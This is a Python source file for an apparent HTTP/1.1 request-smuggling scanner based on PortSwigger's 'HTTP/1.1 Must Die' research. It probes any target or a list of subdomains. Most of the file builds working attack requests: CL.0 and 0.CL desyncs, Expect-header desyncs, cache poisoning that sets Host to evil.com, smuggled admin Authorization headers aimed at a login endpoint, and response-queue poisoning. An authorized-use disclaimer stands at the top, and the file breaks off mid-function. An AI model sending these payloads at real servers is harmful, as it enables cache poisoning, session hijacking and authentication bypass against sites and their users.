#!/usr/bin/env python3
"""
HTTP/1.1 Must Die - Production-Ready Comprehensive Security Scanner
Runs all demonstrations from James Kettle's research paper with full PoC generation

This script orchestrates all the individual attack demonstrations:
1. Parser discrepancy detection with detailed payloads
2. CL.0 desync attacks with complete HTTP requests
3. 0.CL desync with early response gadgets and exploitation chains
4. Expect-based attacks with memory disclosure PoCs
5. HTTP/2 vs HTTP/1.1 security comparison

Features:
- Production-ready error handling and logging
- Complete proof-of-concept generation with HTTP payloads
- Support for any target endpoint (not just localhost)
- Detailed vulnerability reports with exploitation steps
- Safe testing with proper authorization checks
- Export results to JSON/HTML formats

⚠️  FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY
"""

import asyncio
import argparse
import logging
import sys
import os
import time
import json
import base64
import hashlib
from pathlib import Path
from urllib.parse import urlparse
from datetime import datetime
from typing import Dict, List, Optional, Any
import concurrent.futures

# Optional import for async file operations
try:
    import aiofiles
    AIOFILES_AVAILABLE = True
except ImportError:
    AIOFILES_AVAILABLE = False

# Add project directories to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root / "tools" / "parser-detector"))
sys.path.insert(0, str(project_root / "examples" / "cl0-attacks"))
sys.path.insert(0, str(project_root / "examples" / "0cl-attacks"))
sys.path.insert(0, str(project_root / "examples" / "expect-attacks"))
sys.path.insert(0, str(project_root / "examples" / "http2-migration"))

# Configure production-ready logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('desync_scan.log')
    ]
)
logger = logging.getLogger(__name__)

class ProductionDesyncScanner:
    """Production-ready HTTP/1.1 desync vulnerability scanner with PoC generation"""

    def __init__(self, target_url: str = None, timeout: int = 30, verbose: bool = False,
                 output_format: str = 'console', output_file: Optional[str] = None,
                 critical_only: bool = False, subdomain_list: Optional[str] = None,
                 max_concurrent_subdomains: int = 5):
        self.target_url = target_url.rstrip('/') if target_url else None
        self.timeout = timeout
        self.verbose = verbose
        self.output_format = output_format
        self.output_file = output_file
        self.critical_only = critical_only
        self.subdomain_list = subdomain_list
        self.max_concurrent_subdomains = max_concurrent_subdomains
        self.results = {}
        self.proof_of_concepts = []
        self.subdomain_results = {}
        self.failed_subdomains = []

        # Generate scan metadata
        target_for_id = target_url or subdomain_list or "bulk_scan"
        self.scan_metadata = {
            'target': target_url,
            'subdomain_list': subdomain_list,
            'scan_id': hashlib.md5(f"{target_for_id}{time.time()}".encode()).hexdigest()[:8],
            'start_time': datetime.now().isoformat(),
            'scanner_version': '2.1.0',
            'total_vulnerabilities': 0,
            'critical_vulnerabilities': 0,
            'high_vulnerabilities': 0,
            'medium_vulnerabilities': 0,
            'critical_only_mode': critical_only,
            'subdomains_scanned': 0,
            'subdomains_vulnerable': 0,
            'subdomains_failed': 0
        }

        if verbose:
            logging.getLogger().setLevel(logging.DEBUG)

        # Validate inputs
        if not target_url and not subdomain_list:
            raise ValueError("Either target_url or subdomain_list must be provided")

        if target_url:
            parsed = urlparse(target_url)
            if not parsed.scheme or not parsed.netloc:
                raise ValueError(f"Invalid target URL: {target_url}")
            self.target_host = parsed.netloc
            self.target_scheme = parsed.scheme
        else:
            self.target_host = None
            self.target_scheme = None

        if target_url:
            logger.info(f"Initialized scanner for target: {target_url}")
        else:
            logger.info(f"Initialized bulk scanner for subdomain list: {subdomain_list}")
        logger.info(f"Scan ID: {self.scan_metadata['scan_id']}")
        if critical_only:
            logger.info("🔥 Critical-only mode enabled - scanning for CRITICAL vulnerabilities only")

    def add_proof_of_concept(self, vuln_type: str, severity: str, title: str,
                           description: str, http_request: str, expected_response: str,
                           impact: str, remediation: str, references: List[str] = None,
                           target_override: str = None):
        """Add a detailed proof of concept to the results"""

        # Skip non-critical vulnerabilities if in critical-only mode
        if self.critical_only and severity.upper() != 'CRITICAL':
            return

        poc = {
            'id': len(self.proof_of_concepts) + 1,
            'vulnerability_type': vuln_type,
            'severity': severity.upper(),
            'title': title,
            'description': description,
            'target': target_override or self.target_url,
            'discovery_time': datetime.now().isoformat(),
            'http_request': http_request,
            'expected_response': expected_response,
            'impact': impact,
            'remediation': remediation,
            'references': references or [],
            'cvss_score': self._calculate_cvss_score(severity, vuln_type),
            'exploitation_difficulty': self._assess_exploitation_difficulty(vuln_type)
        }

        self.proof_of_concepts.append(poc)

        # Update metadata counters
        if severity.upper() == 'CRITICAL':
            self.scan_metadata['critical_vulnerabilities'] += 1
        elif severity.upper() == 'HIGH':
            self.scan_metadata['high_vulnerabilities'] += 1
        elif severity.upper() == 'MEDIUM':
            self.scan_metadata['medium_vulnerabilities'] += 1

        self.scan_metadata['total_vulnerabilities'] += 1

        logger.warning(f"🔥 {severity.upper()} vulnerability found: {title}")

    async def load_subdomain_list(self) -> List[str]:
        """Load subdomains from file"""
        if not self.subdomain_list:
            return []

        try:
            # Use async file operations if available, otherwise fallback to sync
            if AIOFILES_AVAILABLE:
                async with aiofiles.open(self.subdomain_list, 'r') as f:
                    content = await f.read()
            else:
                with open(self.subdomain_list, 'r') as f:
                    content = f.read()

            # Parse lines, ignoring comments and empty lines
            raw_lines = content.splitlines()
            subdomains = []

            for line_num, line in enumerate(raw_lines, 1):
                line = line.strip()

                # Skip empty lines and comments
                if not line or line.startswith('#'):
                    continue

                subdomains.append(line)

            # Validate and normalize subdomains
            valid_subdomains = []
            for subdomain in subdomains:
                original_subdomain = subdomain

                # Add protocol if missing
                if not subdomain.startswith(('http://', 'https://')):
                    # Default to http for localhost, https for others
                    if 'localhost' in subdomain or '127.0.0.1' in subdomain:
                        subdomain = f"http://{subdomain}"
                    else:
                        subdomain = f"https://{subdomain}"

                try:
                    parsed = urlparse(subdomain)
                    if parsed.netloc:
                        valid_subdomains.append(subdomain)
                        logger.debug(f"Added subdomain: {subdomain}")
                    else:
                        logger.warning(f"Invalid subdomain format: {original_subdomain}")
                except Exception as e:
                    logger.warning(f"Failed to parse subdomain {original_subdomain}: {e}")

            logger.info(f"Loaded {len(valid_subdomains)} valid subdomains from {self.subdomain_list}")
            return valid_subdomains

        except Exception as e:
            logger.error(f"Failed to load subdomain list from {self.subdomain_list}: {e}")
            return []

    async def scan_single_subdomain(self, subdomain: str) -> Dict[str, Any]:
        """Scan a single subdomain for critical vulnerabilities"""
        logger.info(f"🎯 Scanning subdomain: {subdomain}")

        # Create a temporary scanner instance for this subdomain
        subdomain_scanner = ProductionDesyncScanner(
            target_url=subdomain,
            timeout=self.timeout,
            verbose=False,  # Reduce noise for bulk scanning
            critical_only=True  # Always use critical-only for subdomains
        )

        subdomain_results = {
            'subdomain': subdomain,
            'scan_start': datetime.now().isoformat(),
            'vulnerabilities_found': 0,
            'critical_vulnerabilities': 0,
            'scan_status': 'success',
            'error': None,
            'proof_of_concepts': []
        }

        try:
            # Run critical vulnerability tests only
            await subdomain_scanner.run_critical_vulnerability_scan()

            # Collect results
            subdomain_results['vulnerabilities_found'] = len(subdomain_scanner.proof_of_concepts)
            subdomain_results['critical_vulnerabilities'] = subdomain_scanner.scan_metadata['critical_vulnerabilities']
            subdomain_results['proof_of_concepts'] = subdomain_scanner.proof_of_concepts

            # Merge PoCs into main results
            for poc in subdomain_scanner.proof_of_concepts:
                poc['id'] = len(self.proof_of_concepts) + 1  # Renumber for global list
                self.proof_of_concepts.append(poc)
                self.scan_metadata['critical_vulnerabilities'] += 1
                self.scan_metadata['total_vulnerabilities'] += 1

            if subdomain_results['critical_vulnerabilities'] > 0:
                self.scan_metadata['subdomains_vulnerable'] += 1
                logger.warning(f"🔥 {subdomain}: {subdomain_results['critical_vulnerabilities']} CRITICAL vulnerabilities found")
            else:
                logger.info(f"✅ {subdomain}: No critical vulnerabilities detected")

        except Exception as e:
            subdomain_results['scan_status'] = 'failed'
            subdomain_results['error'] = str(e)
            self.failed_subdomains.append(subdomain)
            self.scan_metadata['subdomains_failed'] += 1
            logger.error(f"❌ {subdomain}: Scan failed - {e}")

        subdomain_results['scan_end'] = datetime.now().isoformat()
        return subdomain_results

    async def run_critical_vulnerability_scan(self):
        """Run only critical vulnerability tests (for subdomain scanning)"""
        logger.debug(f"Running critical vulnerability scan for {self.target_url}")

        try:
            # Only run tests that can find CRITICAL vulnerabilities
            await self.run_cl0_attacks()  # CL.0 attacks are typically CRITICAL
            await asyncio.sleep(1)  # Reduced delay for bulk scanning

            # Skip other tests in critical-only mode as they typically find HIGH/MEDIUM
            # unless specifically configured otherwise

        except Exception as e:
            logger.error(f"Critical vulnerability scan failed for {self.target_url}: {e}")
            raise

    async def run_bulk_subdomain_scan(self) -> Dict[str, Any]:
        """Run bulk scanning across multiple subdomains"""
        logger.info("🚀 Starting bulk subdomain scanning for critical vulnerabilities")

        subdomains = await self.load_subdomain_list()
        if not subdomains:
            raise ValueError("No valid subdomains found to scan")

        self.scan_metadata['subdomains_scanned'] = len(subdomains)
        logger.info(f"📋 Scanning {len(subdomains)} subdomains with {self.max_concurrent_subdomains} concurrent workers")

        # Create semaphore for concurrency control
        semaphore = asyncio.Semaphore(self.max_concurrent_subdomains)

        async def scan_with_semaphore(subdomain):
            async with semaphore:
                return await self.scan_single_subdomain(subdomain)

        # Run scans concurrently
        start_time = time.time()
        tasks = [scan_with_semaphore(subdomain) for subdomain in subdomains]

        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            logger.error(f"Bulk scanning failed: {e}")
            raise

        # Process results
        successful_scans = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                logger.error(f"Subdomain scan {i} failed with exception: {result}")
                self.failed_subdomains.append(subdomains[i])
                self.scan_metadata['subdomains_failed'] += 1
            else:
                successful_scans.append(result)
                self.subdomain_results[result['subdomain']] = result

        scan_duration = time.time() - start_time

        # Update final metadata
        vulnerable_count = self.scan_metadata['subdomains_vulnerable']
        total_vulns = self.scan_metadata['total_vulnerabilities']

        logger.info(f"🏁 Bulk scan completed in {scan_duration:.1f} seconds")
        logger.info(f"📊 Results: {vulnerable_count}/{len(subdomains)} subdomains vulnerable")
        logger.info(f"🔥 Total critical vulnerabilities found: {total_vulns}")

        return {
            'scan_summary': self.scan_metadata,
            'subdomain_results': self.subdomain_results,
            'failed_subdomains': self.failed_subdomains,
            'scan_duration': scan_duration
        }

    def _calculate_cvss_score(self, severity: str, vuln_type: str) -> float:
        """Calculate CVSS score based on vulnerability type and severity"""
        base_scores = {
            'CRITICAL': 9.0,
            'HIGH': 7.5,
            'MEDIUM': 5.0,
            'LOW': 2.0
        }

        # Adjust based on vulnerability type
        adjustments = {
            'REQUEST_SMUGGLING': 1.0,
            'CACHE_POISONING': 0.8,
            'MEMORY_DISCLOSURE': 0.6,
            'PARSER_DISCREPANCY': 0.4
        }

        base = base_scores.get(severity.upper(), 5.0)
        adjustment = adjustments.get(vuln_type, 0.0)

        return min(10.0, base + adjustment)

    def _assess_exploitation_difficulty(self, vuln_type: str) -> str:
        """Assess exploitation difficulty"""
        difficulty_map = {
            'REQUEST_SMUGGLING': 'Medium',
            'CACHE_POISONING': 'Medium',
            'MEMORY_DISCLOSURE': 'Low',
            'PARSER_DISCREPANCY': 'High'
        }

        return difficulty_map.get(vuln_type, 'Medium')
    
    async def run_parser_detection(self):
        """Run parser discrepancy detection with detailed PoC generation"""
        logger.info("🔍 Running parser discrepancy detection...")

        try:
            from detect_discrepancies import ParserDiscrepancyDetector

            async with ParserDiscrepancyDetector(self.target_url, self.timeout) as detector:
                results = await detector.run_all_tests()
                summary = detector.analyze_results()

                # Generate detailed PoCs for high-confidence findings
                for finding in summary.get('high_confidence_findings', []):
                    self._generate_parser_discrepancy_poc(finding)

                self.results['parser_detection'] = {
                    'total_tests': summary['total_tests'],
                    'discrepancies_found': summary['discrepancies_found'],
                    'vh_discrepancies': summary['vh_discrepancies'],
                    'hv_discrepancies': summary['hv_discrepancies'],
                    'vulnerable_headers': summary['vulnerable_headers'],
                    'high_confidence': len(summary['high_confidence_findings']),
                    'recommendations': summary['recommendations'],
                    'detailed_findings': summary.get('high_confidence_findings', [])
                }

                logger.info(f"✅ Parser detection complete: {summary['discrepancies_found']} discrepancies found")

        except Exception as e:
            logger.error(f"❌ Parser detection failed: {e}")
            self.results['parser_detection'] = {'error': str(e)}

    def _generate_parser_discrepancy_poc(self, finding):
        """Generate detailed PoC for parser discrepancy"""

        header_name = finding.header_name
        permutation = finding.permutation
        discrepancy_type = finding.discrepancy_type

        # Create the malicious header based on permutation
        if permutation == 'leading_space':
            malicious_header = f' {header_name}'
        elif permutation == 'trailing_space':
            malicious_header = f'{header_name} '
        elif permutation == 'tab_prefix':
            malicious_header = f'\t{header_name}'
        elif permutation == 'underscore':
            malicious_header = header_name.replace('-', '_')
        elif permutation == 'case_variation':
            malicious_header = header_name.upper()
        else:
            malicious_header = header_name

        # Generate HTTP request payload
        if discrepancy_type == 'V-H':
            # Frontend sees header, backend doesn't
            http_request = f"""GET /test HTTP/1.1\r
Host: {self.target_host}\r
{malicious_header}: malicious_value\r
Connection: keep-alive\r
\r
"""

            title = f"V-H Parser Discrepancy in {header_name} Header"
            description = f"Frontend proxy sees the '{malicious_header}' header but backend server ignores it due to {permutation} obfuscation. This enables request smuggling attacks."
            impact = "Attackers can bypass security controls, poison caches, and smuggle requests to backend servers."

        else:  # H-V
            # Frontend doesn't see header, backend does
            http_request = f"""GET /test HTTP/1.1\r
Host: {self.target_host}\r
{malicious_header}: backend_only_value\r
Connection: keep-alive\r
\r
"""

            title = f"H-V Parser Discrepancy in {header_name} Header"
            description = f"Frontend proxy ignores the '{malicious_header}' header but backend server processes it due to {permutation} parsing differences."
            impact = "Attackers can inject headers that only the backend sees, potentially bypassing authentication or authorization controls."

        self.add_proof_of_concept(
            vuln_type='PARSER_DISCREPANCY',
            severity='HIGH',
            title=title,
            description=description,
            http_request=http_request,
            expected_response=f"Different responses from frontend vs backend indicating {discrepancy_type} discrepancy",
            impact=impact,
            remediation="Normalize all headers before forwarding to backend. Migrate to HTTP/2 upstream connections.",
            references=[
                "https://portswigger.net/research/http1-must-die",
                "https://portswigger.net/web-security/request-smuggling"
            ]
        )
    
    async def run_cl0_attacks(self):
        """Run CL.0 desync attacks with detailed PoC generation"""
        logger.info("🎯 Running CL.0 desync attacks...")

        try:
            from basic_cl0_demo import CL0DesyncDemo

            async with CL0DesyncDemo(self.target_url, self.timeout) as demo:
                results = await demo.run_safe_demo()

                # Generate PoCs for successful attacks
                if results.get('basic_vulnerability'):
                    self._generate_cl0_basic_poc()

                if results.get('cache_poisoning'):
                    self._generate_cl0_cache_poisoning_poc()

                if results.get('header_smuggling'):
                    self._generate_cl0_header_smuggling_poc()

                self.results['cl0_attacks'] = {
                    'basic_vulnerability': results.get('basic_vulnerability', False),
                    'cache_poisoning': results.get('cache_poisoning', False),
                    'header_smuggling': results.get('header_smuggling', False),
                    'error': results.get('error')
                }

                vulnerable_count = sum(1 for v in results.values() if v is True)
                logger.info(f"✅ CL.0 attacks complete: {vulnerable_count} vulnerabilities found")

        except Exception as e:
            logger.error(f"❌ CL.0 attacks failed: {e}")
            self.results['cl0_attacks'] = {'error': str(e)}

    def _generate_cl0_basic_poc(self):
        """Generate PoC for basic CL.0 desync vulnerability"""

        http_request = f"""GET /style.css HTTP/1.1\r
Host: {self.target_host}\r
 Content-Length: 23\r
Connection: keep-alive\r
\r
GET /404 HTTP/1.1\r
X: y"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='CRITICAL',
            title='CL.0 Request Smuggling Vulnerability',
            description='Server vulnerable to Content-Length.0 desync attacks. Frontend sees hidden Content-Length header (space prefix), backend ignores it, causing request boundary confusion.',
            http_request=http_request,
            expected_response='Frontend serves CSS file (200), backend processes smuggled 404 request',
            impact='Complete request smuggling capability. Attackers can bypass security controls, poison caches, hijack user sessions, and gain unauthorized access.',
            remediation='Normalize headers before forwarding. Reject requests with malformed headers. Migrate to HTTP/2.',
            references=[
                'https://portswigger.net/research/http1-must-die',
                'https://portswigger.net/web-security/request-smuggling/exploiting'
            ]
        )

    def _generate_cl0_cache_poisoning_poc(self):
        """Generate PoC for CL.0 cache poisoning attack"""

        http_request = f"""GET /static/app.js HTTP/1.1\r
Host: {self.target_host}\r
 Content-Length: 87\r
Connection: keep-alive\r
\r
GET /static/app.js HTTP/1.1\r
Host: evil.com\r
X-Forwarded-Host: evil.com\r
\r
"""

        self.add_proof_of_concept(
            vuln_type='CACHE_POISONING',
            severity='CRITICAL',
            title='CL.0 Cache Poisoning Attack',
            description='CL.0 desync enables cache poisoning by smuggling requests with malicious Host headers. Subsequent users receive poisoned responses.',
            http_request=http_request,
            expected_response='Cache entry poisoned with evil.com content, affecting all subsequent users',
            impact='Mass user compromise. All users requesting the poisoned resource receive attacker-controlled content, enabling XSS, credential theft, and malware distribution.',
            remediation='Implement strict cache key validation. Normalize headers. Deploy cache poisoning protection.',
            references=[
                'https://portswigger.net/research/practical-web-cache-poisoning',
                'https://portswigger.net/research/http1-must-die'
            ]
        )

    def _generate_cl0_header_smuggling_poc(self):
        """Generate PoC for CL.0 header smuggling attack"""

        http_request = f"""POST /api/login HTTP/1.1\r
Host: {self.target_host}\r
 Content-Length: 120\r
Content-Type: application/x-www-form-urlencoded\r
Connection: keep-alive\r
\r
POST /api/login HTTP/1.1\r
Host: {self.target_host}\r
X-Forwarded-For: 127.0.0.1\r
Authorization: Bearer admin_token\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 25\r
\r
username=admin&password=x"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='CRITICAL',
            title='CL.0 Header Smuggling for Privilege Escalation',
            description='CL.0 desync enables smuggling of privileged headers like Authorization tokens to victim requests, causing privilege escalation.',
            http_request=http_request,
            expected_response='Victim user receives admin privileges from smuggled Authorization header',
            impact='Complete authentication bypass and privilege escalation. Attackers can gain administrative access using victim requests.',
            remediation='Validate and sanitize all headers. Implement proper authentication token validation. Migrate to HTTP/2.',
            references=[
                'https://portswigger.net/research/http1-must-die',
                'https://portswigger.net/web-security/request-smuggling/exploiting'
            ]
        )
    
    async def run_0cl_attacks(self):
        """Run 0.CL desync attacks with early response gadgets and detailed PoCs"""
        logger.info("🔥 Running 0.CL desync attacks...")

        try:
            from early_response_gadgets import ZeroCLDesyncDemo

            async with ZeroCLDesyncDemo(self.target_url, self.timeout) as demo:
                results = await demo.run_comprehensive_demo()

                # Generate PoCs for discovered gadgets and exploits
                gadgets_found = results.get('gadgets_found', [])
                if gadgets_found:
                    self._generate_early_response_gadget_poc(gadgets_found)

                for gadget in results.get('deadlock_breaks', []):
                    self._generate_0cl_deadlock_break_poc(gadget)

                for gadget in results.get('exploitations', []):
                    self._generate_0cl_exploitation_poc(gadget)

                for gadget in results.get('double_desyncs', []):
                    self._generate_double_desync_poc(gadget)

                self.results['0cl_attacks'] = {
                    'gadgets_found': len(gadgets_found),
                    'deadlock_breaks': len(results.get('deadlock_breaks', [])),
                    'exploitations': len(results.get('exploitations', [])),
                    'double_desyncs': len(results.get('double_desyncs', [])),
                    'error': results.get('error'),
                    'gadget_list': gadgets_found
                }

                total_vulns = (len(results.get('deadlock_breaks', [])) +
                              len(results.get('exploitations', [])) +
                              len(results.get('double_desyncs', [])))
                logger.info(f"✅ 0.CL attacks complete: {total_vulns} vulnerabilities found")

        except Exception as e:
            logger.error(f"❌ 0.CL attacks failed: {e}")
            self.results['0cl_attacks'] = {'error': str(e)}

    def _generate_early_response_gadget_poc(self, gadgets: List[str]):
        """Generate PoC for early response gadgets discovery"""

        gadget_examples = gadgets[:5]  # Show first 5 as examples

        http_request = f"""GET /{gadgets[0]} HTTP/1.1\r
Host: {self.target_host}\r
Content-Length: 10\r
Connection: keep-alive\r
\r
"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='HIGH',
            title=f'Early Response Gadgets Discovered ({len(gadgets)} total)',
            description=f'Server responds immediately to Windows reserved names without waiting for request body. Gadgets found: {", ".join(gadget_examples)}{"..." if len(gadgets) > 5 else ""}',
            http_request=http_request,
            expected_response='Immediate response without waiting for Content-Length body',
            impact='Enables breaking 0.CL deadlocks and advanced request smuggling attacks. Critical for chaining complex desync exploits.',
            remediation='Block access to Windows reserved names. Implement proper request body handling. Migrate to HTTP/2.',
            references=[
                'https://portswigger.net/research/http1-must-die',
                'https://portswigger.net/research/browser-powered-desync-attacks'
            ]
        )

    def _generate_0cl_deadlock_break_poc(self, gadget: str):
        """Generate PoC for 0.CL deadlock break"""

        http_request = f"""GET /{gadget} HTTP/1.1\r
Host: {self.target_host}\r
Content-Length:\r
 7\r
Connection: keep-alive\r
\r
GET /404 HTTP/1.1\r
X: y"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='CRITICAL',
            title=f'0.CL Deadlock Break via /{gadget}',
            description=f'Successfully broke 0.CL deadlock using early response gadget /{gadget}. Hidden Content-Length header causes parsing discrepancy.',
            http_request=http_request,
            expected_response='Early response from gadget, followed by smuggled request processing',
            impact='Enables advanced request smuggling chains. Can bypass security controls and poison responses.',
            remediation='Block Windows reserved names. Normalize Content-Length headers. Implement strict parsing.',
            references=[
                'https://portswigger.net/research/http1-must-die'
            ]
        )

    def _generate_0cl_exploitation_poc(self, gadget: str):
        """Generate PoC for 0.CL exploitation"""

        http_request = f"""GET /{gadget} HTTP/1.1\r
Host: {self.target_host}\r
Content-Length:\r
 20\r
Connection: keep-alive\r
\r
GET / HTTP/1.1\r
X: yGET /admin HTTP/1.1\r
Host: {self.target_host}\r
\r
"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='CRITICAL',
            title=f'0.CL Request Smuggling Exploitation via /{gadget}',
            description=f'Successfully exploited 0.CL vulnerability using /{gadget} to control victim responses and access restricted resources.',
            http_request=http_request,
            expected_response='Victim receives admin page response instead of normal page',
            impact='Complete request smuggling exploitation. Attackers can control victim responses, access restricted areas, and steal sensitive data.',
            remediation='Immediately block Windows reserved names. Implement strict Content-Length validation. Migrate to HTTP/2.',
            references=[
                'https://portswigger.net/research/http1-must-die'
            ]
        )

    def _generate_double_desync_poc(self, gadget: str):
        """Generate PoC for double desync attack"""

        http_request = f"""POST /{gadget} HTTP/1.1\r
Host: {self.target_host}\r
Content-Length:\r
 163\r
Connection: keep-alive\r
\r
POST / HTTP/1.1\r
Content-Length: 111\r
\r
GET / HTTP/1.1\r
Host: {self.target_host}\r
\r
GET /admin HTTP/1.1\r
Foo: bar"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='CRITICAL',
            title=f'Double Desync Attack via /{gadget}',
            description=f'Successfully performed double desync attack using /{gadget}, converting 0.CL into CL.0 for enhanced exploitation.',
            http_request=http_request,
            expected_response='Connection poisoned, subsequent requests become CL.0 attacks',
            impact='Most advanced form of request smuggling. Enables persistent connection poisoning and sophisticated attack chains.',
            remediation='Critical: Block all Windows reserved names immediately. Implement connection-level protections. Migrate to HTTP/2.',
            references=[
                'https://portswigger.net/research/http1-must-die'
            ]
        )
    
    async def run_expect_attacks(self):
        """Run Expect-based desync attacks with detailed PoC generation"""
        logger.info("💣 Running Expect-based attacks...")

        try:
            from expect_desync_demo import ExpectDesyncDemo

            async with ExpectDesyncDemo(self.target_url, self.timeout) as demo:
                results = await demo.run_comprehensive_demo()

                # Generate PoCs for successful attacks
                memory_disclosure = results.get('memory_disclosure', {})
                if memory_disclosure.get('memory_disclosed'):
                    self._generate_expect_memory_disclosure_poc(memory_disclosure)

                if results.get('header_bypass', {}).get('bypass_successful'):
                    self._generate_expect_header_bypass_poc(results.get('header_bypass', {}))

                if results.get('vanilla_0cl'):
                    self._generate_vanilla_expect_0cl_poc()

                if results.get('obfuscated_0cl'):
                    self._generate_obfuscated_expect_0cl_poc()

                if results.get('expect_cl0'):
                    self._generate_expect_cl0_poc()

                if results.get('head_vulnerability'):
                    self._generate_expect_head_poc()

                self.results['expect_attacks'] = {
                    'memory_disclosure': memory_disclosure.get('memory_disclosed', False),
                    'header_bypass': results.get('header_bypass', {}).get('bypass_successful', False),
                    'vanilla_0cl': results.get('vanilla_0cl', False),
                    'obfuscated_0cl': results.get('obfuscated_0cl', False),
                    'expect_cl0': results.get('expect_cl0', False),
                    'head_vulnerability': results.get('head_vulnerability', False),
                    'error': results.get('error'),
                    'memory_fragments': memory_disclosure.get('fragments_found', [])
                }

                vulnerable_count = sum(1 for k, v in self.results['expect_attacks'].items()
                                     if k not in ['error', 'memory_fragments'] and v is True)
                logger.info(f"✅ Expect attacks complete: {vulnerable_count} vulnerabilities found")

        except Exception as e:
            logger.error(f"❌ Expect attacks failed: {e}")
            self.results['expect_attacks'] = {'error': str(e)}

    def _generate_expect_memory_disclosure_poc(self, memory_data: Dict):
        """Generate PoC for Expect memory disclosure"""

        fragments = memory_data.get('fragments_found', [])
        vulnerable_variations = memory_data.get('vulnerable_variations', ['100-continue'])

        http_request = f"""POST /test HTTP/1.1\r
Host: {self.target_host}\r
Expect: {vulnerable_variations[0] if vulnerable_variations else '100-continue'}\r
Content-Length: 1\r
\r
X"""

        self.add_proof_of_concept(
            vuln_type='MEMORY_DISCLOSURE',
            severity='HIGH',
            title='Expect Header Memory Disclosure',
            description=f'Server leaks memory fragments when processing Expect headers. Disclosed fragments: {", ".join(fragments[:3])}{"..." if len(fragments) > 3 else ""}',
            http_request=http_request,
            expected_response=f'Response contains memory fragments like: {fragments[0] if fragments else "HTTP/1.1 100 Continue"}',
            impact='Information disclosure vulnerability. Attackers can extract sensitive server memory contents including tokens, headers, and internal data.',
            remediation='Fix Expect header processing logic. Implement proper memory management. Validate all Expect header values.',
            references=[
                'https://portswigger.net/research/http1-must-die',
                'https://cwe.mitre.org/data/definitions/200.html'
            ]
        )

    def _generate_expect_header_bypass_poc(self, bypass_data: Dict):
        """Generate PoC for Expect header bypass"""

        additional_headers = bypass_data.get('additional_headers', [])

        http_request = f"""GET /test HTTP/1.1\r
Host: {self.target_host}\r
Expect: 100-continue\r
\r
"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='MEDIUM',
            title='Expect Header Response Bypass',
            description=f'Expect header bypasses response header removal, exposing additional headers: {", ".join(additional_headers)}',
            http_request=http_request,
            expected_response=f'Additional headers exposed: {", ".join(additional_headers)}',
            impact='Information disclosure through header exposure. May reveal internal server details, debugging information, or security headers.',
            remediation='Implement consistent header filtering regardless of Expect header presence. Review response header policies.',
            references=[
                'https://portswigger.net/research/http1-must-die'
            ]
        )

    def _generate_vanilla_expect_0cl_poc(self):
        """Generate PoC for vanilla Expect 0.CL desync"""

        http_request = f"""GET /logout HTTP/1.1\r
Host: {self.target_host}\r
Expect: 100-continue\r
Content-Length: 291\r
\r
GET /logout HTTP/1.1\r
Host: {self.target_host}\r
Content-Length: 100\r
\r
GET / HTTP/1.1\r
Host: {self.target_host}\r
\r
GET https://evil.com/assets HTTP/1.1\r
X: y"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='CRITICAL',
            title='Vanilla Expect 0.CL Desync Attack',
            description='Standard Expect: 100-continue header causes 0.CL desync, enabling request smuggling and response queue poisoning.',
            http_request=http_request,
            expected_response='Victim redirected to evil.com instead of normal response',
            impact='Complete request smuggling capability. Enables response queue poisoning, cache poisoning, and user redirection to malicious sites.',
            remediation='Implement proper Expect header handling. Validate Content-Length consistency. Migrate to HTTP/2.',
            references=[
                'https://portswigger.net/research/http1-must-die'
            ]
        )

    def _generate_obfuscated_expect_0cl_poc(self):
        """Generate PoC for obfuscated Expect 0.CL desync"""

        http_request = f"""GET / HTTP/1.1\r
Host: {self.target_host}\r
Content-Length: 686\r
Expect: y 100-continue\r
\r
GET / HTTP/1.1\r
Content-Length: 292\r
\r
GET / HTTP/1.1\r
Host: {self.target_host}\r
\r
GET / HTTP/1.1\r
Host: {self.target_host}\r
\r
"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='CRITICAL',
            title='Obfuscated Expect 0.CL Desync with Response Queue Poisoning',
            description='Obfuscated Expect header (y 100-continue) bypasses filters and causes 0.CL desync with response queue poisoning.',
            http_request=http_request,
            expected_response='Response queue poisoning - victims receive responses intended for other users',
            impact='Advanced request smuggling with response queue poisoning. Victims receive other users\' responses, leading to data leakage and session hijacking.',
            remediation='Implement strict Expect header validation. Reject malformed Expect headers. Fix response queue handling.',
            references=[
                'https://portswigger.net/research/http1-must-die'
            ]
        )

    def _generate_expect_cl0_poc(self):
        """Generate PoC for Expect CL.0 desync"""

        http_request = f"""OPTIONS /anything HTTP/1.1\r
Host: {self.target_host}\r
Expect:\r
 100-continue\r
Content-Length: 39\r
\r
GET / HTTP/1.1\r
Host: evil.com\r
X: X"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='CRITICAL',
            title='Expect CL.0 Desync Attack',
            description='Hidden Expect header (space prefix) causes CL.0 desync, enabling cache poisoning and content injection.',
            http_request=http_request,
            expected_response='Victim served content from evil.com domain',
            impact='Cache poisoning and content injection. All users requesting the resource receive attacker-controlled content.',
            remediation='Normalize Expect headers. Reject malformed headers. Implement cache poisoning protection.',
            references=[
                'https://portswigger.net/research/http1-must-die'
            ]
        )

    def _generate_expect_head_poc(self):
        """Generate PoC for Expect HEAD vulnerability"""

        http_request = f"""HEAD /test HTTP/1.1\r
Host: {self.target_host}\r
Content-Length: 6\r
Expect: 100-continue\r
\r
ABCDEF"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='MEDIUM',
            title='Expect HEAD Request Vulnerability',
            description='Expect header with HEAD request causes server confusion about response body handling, leading to upstream deadlock.',
            http_request=http_request,
